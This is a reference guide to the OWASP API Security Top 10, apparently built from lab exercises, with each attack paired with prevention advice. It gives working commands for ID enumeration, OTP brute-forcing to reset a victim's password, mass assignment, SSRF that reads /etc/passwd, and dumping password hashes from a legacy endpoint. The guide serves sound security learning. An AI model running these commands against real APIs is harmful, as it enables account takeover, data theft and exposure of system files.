# API Security Attacks: Reference

A reference for the OWASP API Security Top 10 (2023). It covers each risk category with its concept, lab examples, exploitation commands, and prevention guidance, followed by a tools summary and a consolidated prevention cheat sheet.

---

## Table of Contents

1. [Introduction to API Attacks](#1-introduction-to-api-attacks)
2. [OWASP API Top 10 Overview](#2-owasp-api-top-10-2023)
3. [API1: Broken Object Level Authorization (BOLA / IDOR)](#3-api1-broken-object-level-authorization-bola--idor)
4. [API2: Broken Authentication](#4-api2-broken-authentication)
5. [API3: Broken Object Property Level Authorization](#5-api3-broken-object-property-level-authorization)
6. [API4: Unrestricted Resource Consumption](#6-api4-unrestricted-resource-consumption)
7. [API5: Broken Function Level Authorization](#7-api5-broken-function-level-authorization)
8. [API6: Unrestricted Access to Sensitive Business Flows](#8-api6-unrestricted-access-to-sensitive-business-flows)
9. [API7: Server-Side Request Forgery (SSRF)](#9-api7-server-side-request-forgery-ssrf)
10. [API8: Security Misconfiguration](#10-api8-security-misconfiguration)
11. [API9: Improper Inventory Management](#11-api9-improper-inventory-management)
12. [API10: Unsafe Consumption of APIs](#12-api10-unsafe-consumption-of-apis)
13. [Tools and Techniques Summary](#13-tools-and-techniques-summary)
14. [Prevention Cheat Sheet](#14-prevention-cheat-sheet)

---

## 1. Introduction to API Attacks

APIs are the backbone of modern software and enable communication between systems. Common styles include REST, SOAP, GraphQL, and gRPC. REST is the most prevalent: it is stateless, uses HTTP methods, and returns JSON or XML.

APIs are often vulnerable because they:
- Expose sensitive data
- Contain authentication and authorization flaws
- Lack rate limiting
- Handle errors improperly
- Ship with misconfigurations

---

## 2. OWASP API Top 10 (2023)

| ID | Risk |
|---|---|
| API1 | Broken Object Level Authorization |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization |
| API6 | Unrestricted Access to Sensitive Business Flows |
| API7 | Server-Side Request Forgery |
| API8 | Security Misconfiguration |
| API9 | Improper Inventory Management |
| API10 | Unsafe Consumption of APIs |

---

## 3. API1: Broken Object Level Authorization (BOLA / IDOR)

**CWE-639:** Authorization Bypass Through User-Controlled Key

### Concept

The endpoint accepts an object identifier (an ID or UUID) but does not verify that the requester owns the object or is authorized to access it. Changing the identifier exposes other users' data.

### Lab example

- Endpoint: `GET /api/v1/supplier-companies/yearly-reports/{ID}` (integer ID)
- Required role: `SupplierCompanies_GetYearlyReportByID`
- Exploit: increment the ID to read other companies' financial reports.

```bash
for i in {1..20}; do
  curl -s "http://TARGET/api/v1/supplier-companies/yearly-reports/$i" \
    -H "Authorization: Bearer $JWT" | jq
done
```

### Prevention

- Verify object ownership on every request. Compare the report's company ID with the authenticated user's company ID.
- Deny access on mismatch.
- Never rely on client-supplied IDs alone.

---

## 4. API2: Broken Authentication

**CWE-307:** Improper Restriction of Excessive Authentication Attempts

### Concept

Authentication can be bypassed through brute force, weak password policies, or low-entropy OTPs and security answers. The absence of rate limiting makes these practical.

### Lab examples

- **Password brute force:** run ffuf with a wordlist against the sign-in endpoint.
- **OTP brute force:** a four-digit OTP with no rate limit can be enumerated from 0000 to 9999.
- **Security question brute force:** the answer is a common color.

OTP brute force with ffuf:

```bash
seq -w 0000 9999 > otp.txt

ffuf -u "http://TARGET/api/v2/authentication/customers/passwords/resets" \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email":"<VICTIM_EMAIL>","OTP":"FUZZ","NewPassword":"<NEW_PASSWORD>"}' \
  -w otp.txt:FUZZ -fr '"successStatus":false' -t 100
```

### Prevention

- Rate limit per IP address and per account.
- Enforce a strong password policy (length, complexity, and a block list of common passwords).
- Require MFA for sensitive actions.
- For OTPs, use short expiry, single use, and a limit on attempts.

---

## 5. API3: Broken Object Property Level Authorization

**CWE-213:** Exposure of Sensitive Information Due to Incompatible Policies
**CWE-915:** Improperly Controlled Modification of Dynamically Determined Object Attributes

This category has two forms:

- **Excessive data exposure:** the API returns fields users should not see, such as email addresses, phone numbers, or password hashes.
- **Mass assignment:** the API accepts fields users should not be able to modify, such as a role or a fee exemption flag.

### Lab examples

- `GET /api/v1/suppliers` returns email and phone number fields to customers.
- `PATCH /api/v1/supplier-companies` accepts `IsExemptedFromMarketplaceFee` from a supplier.

Mass assignment request:

```http
PATCH /api/v1/supplier-companies
Content-Type: application/json

{
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "<COMPANY_ID>",
    "IsExemptedFromMarketplaceFee": 1,
    "CertificateOfIncorporationPDFFileURI": "<URI>"
  }
}
```

### Prevention

- Filter response fields with response DTOs.
- Accept only allowlisted fields in request DTOs.
- Never bind a request body directly to a domain model.

---

## 6. API4: Unrestricted Resource Consumption

**CWE-400:** Uncontrolled Resource Consumption

### Concept

The API does not limit resource use. Relevant controls include file size, file type, request rate, and query complexity. Gaps lead to denial of service, financial cost (for example, SMS sending), and malware hosting.

### Lab examples

- A 30 MB file uploaded to the certificates endpoint was accepted.
- An executable was accepted and stored in a publicly downloadable web root.
- An SMS OTP endpoint could be flooded to generate costs.

Oversized upload test:

```bash
dd if=/dev/urandom of=large.pdf bs=1M count=30

curl -X POST "http://TARGET/api/v1/supplier-companies/certificates-of-incorporation" \
  -H "Authorization: Bearer $JWT" \
  -F "CertificateOfIncorporationPDFFormFile=@large.pdf" \
  -F "CompanyID=<COMPANY_ID>"
```

### Prevention

- Enforce file size limits.
- Validate file extensions against an allowlist.
- Validate file content (magic bytes, antivirus scanning).
- Apply rate limiting.
- Store uploads outside the web root, and require authentication for downloads.

---

## 7. API5: Broken Function Level Authorization

**CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor

### Concept

An unprivileged user can call a privileged endpoint because the role check is missing or incomplete.

### Lab example

- `GET /api/v1/products/discounts` requires the `ProductDiscounts_GetAll` role. A user with no roles still received all discounts.
- `GET /api/v1/customers/billing-addresses` returned every address without a role check.

```bash
curl -s "http://TARGET/api/v1/customers/billing-addresses" \
  -H "Authorization: Bearer $JWT"
```

### Prevention

- Enforce role checks on every endpoint.
- Deny by default.
- Use centralized authorization middleware.
- Test every endpoint with every role.

---

## 8. API6: Unrestricted Access to Sensitive Business Flows

### Concept

The API exposes business flows such as discounts, purchases, and refunds without adequate access control. Attackers can abuse them for financial gain.

### Lab example

- `GET /api/v1/products/discounts` leaks discount schedules, including dates and rates.
- An attacker can buy stock during a discount window and resell it after the discount ends.
- With no rate limit on the purchase endpoint, this can scale to mass buying.

### Prevention

- Restrict sensitive business data to authorized roles.
- Rate limit purchase endpoints.
- Set per-customer purchase caps.
- Monitor for anomalous purchasing patterns.

---

## 9. API7: Server-Side Request Forgery (SSRF)

**CWE-918:** Server-Side Request Forgery

### Concept

The API fetches a user-controlled URL or path without validation, which lets an attacker reach internal resources or local files.

### Lab examples

- The `PATCH /api/v1/supplier-companies` endpoint accepts a `CertificateOfIncorporationPDFFileURI` value. Setting it to a `file://` URI and then requesting the related GET endpoint returned the file's contents, base64-encoded.
- A similar field, `ProfessionalCVPDFFileURI`, could be pointed at a local file in the same way.

```bash
# Set the URI
curl -X PATCH "http://TARGET/api/v1/supplier-companies" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"UpdatedSupplierCompany":{"SupplierCompanyID":"<COMPANY_ID>","IsExemptedFromMarketplaceFee":1,"CertificateOfIncorporationPDFFileURI":"file:///etc/passwd"}}'

# Read the file
curl -s "http://TARGET/api/v1/supplier-companies/<COMPANY_ID>/certificates-of-incorporation" \
  -H "Authorization: Bearer $JWT" | jq -r '.base64Data' | base64 -d
```

### Prevention

- Allowlist permitted URIs, restricted to a specific directory.
- Canonicalize paths, and reject traversal sequences such as `../`.
- Do not accept URIs from the client. Generate them server-side.
- Block dangerous schemes such as `file://` and `gopher://`.

---

## 10. API8: Security Misconfiguration

**CWE-89:** SQL Injection
**Also:** missing or insecure HTTP security headers

### Concept

This is a broad category that includes injection flaws, missing security headers, verbose errors, default credentials, and debug mode left enabled.

### Lab examples

- **SQL injection** in `GET /api/v1/products/{Name}/count`. A payload that closes the string and adds a tautology returned the count of every row.
- **Wildcard CORS:** the response sent `Access-Control-Allow-Origin: *`.

```bash
curl -s "http://TARGET/api/v1/products/<URL_ENCODED_PAYLOAD>/count" \
  -H "Authorization: Bearer $JWT"
```

### Prevention

- Use parameterized queries or an ORM.
- Validate input against an allowlist.
- Set security headers:
  - `Access-Control-Allow-Origin` restricted to an explicit allowlist
  - `X-Content-Type-Options: nosniff`
  - `Strict-Transport-Security`

---

## 11. API9: Improper Inventory Management

### Concept

Deprecated API versions remain reachable, often without authentication and with known vulnerabilities.

### Lab examples

- Legacy `v0` endpoints were exposed under `/api/v0/...` with no authentication.
- `GET /api/v0/suppliers/deleted` returned the password hashes of deleted suppliers.

```bash
curl -s "http://TARGET/api/v0/suppliers/deleted" | jq
```

### Prevention

- Remove old API versions.
- Restrict legacy versions to internal networks.
- Apply the same authentication as the current version.
- Maintain an API inventory and a sunset policy.

---

## 12. API10: Unsafe Consumption of APIs

**CWE-1357:** Reliance on Insufficiently Trustworthy Component

### Concept

The API trusts data from third-party or internal APIs without validation. The result can be injection, SSRF, data corruption, or remote code execution.

### Lab example

If the v1 API ingests data from the legacy `v0` deleted-suppliers endpoint without validation, the password hash of a deleted supplier flows into v1 data. The lab's answer was that hash, which is redacted here.

### Prevention

- Validate and sanitize all external data.
- Use secure channels (HTTPS, or mutual TLS between services).
- Authenticate calls between APIs.
- Apply rate limiting and monitoring.

---

## 13. Tools and Techniques Summary

| Tool | Use |
|---|---|
| curl | Manual API requests |
| jq | JSON parsing |
| ffuf | Brute force (passwords, OTPs, endpoints) |
| graphw00f | GraphQL engine fingerprinting |
| GraphQL Voyager | GraphQL schema visualization |
| GraphQL-Cop | Automated GraphQL security audit |
| InQL | Burp extension for GraphQL testing |
| Swagger UI | Interactive API documentation |

---

## 14. Prevention Cheat Sheet

| Risk | Prevention |
|---|---|
| BOLA | Verify object ownership on every request |
| Broken authentication | Rate limiting, strong passwords, MFA |
| BOPLA | Request and response DTOs, field allowlists |
| Resource consumption | Size limits, rate limits, file type validation |
| BFLA | Role checks on every endpoint, deny by default |
| Business flows | Restrict sensitive data, rate limit purchases |
| SSRF | Allowlist URIs, canonicalize paths, block schemes |
| Misconfiguration | Parameterized queries, security headers |
| Inventory | Remove old versions, maintain an inventory |
| Unsafe consumption | Validate all external data, use secure channels |

### Golden rules

- Authenticate and authorize every request.
- Validate and sanitize all input.
- Limit resource consumption.
- Encrypt data in transit.
- Log and monitor API activity.
- Keep an inventory of all API versions and endpoints.
- Never trust third-party data without validation.
